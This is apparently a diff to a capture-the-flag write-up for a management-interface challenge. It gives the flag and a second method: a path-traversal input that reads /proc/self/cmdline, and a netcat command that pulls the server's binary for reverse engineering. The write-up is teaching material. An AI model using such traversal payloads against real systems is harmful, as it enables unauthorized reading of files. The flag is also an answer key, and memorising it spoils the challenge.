@@ -4,3 +4,18 @@ Then, I serached for some file like ../password or ../flag and the flag is in th
 
 
 CTF{I_luv_buggy_sOFtware}
+
+--------------------------------------------------------------------------
+A different apporach: (More systematic)
+
+Display current running process by reading file from /proc/self/cmdline
+```
+nc mngmnt-iface.ctfcompetition.com 1337
+2
+../../../../../../../proc/self/cmdline
+```
+The above series of command will show the current running program: ./main
+
+Then, we can make the connection to output the binary file of the current running program to further analyze the program using IDA
+echo -e "2\n../main" | nc -v mngmnt-iface.ctfcompetition.com 1337 > main
+
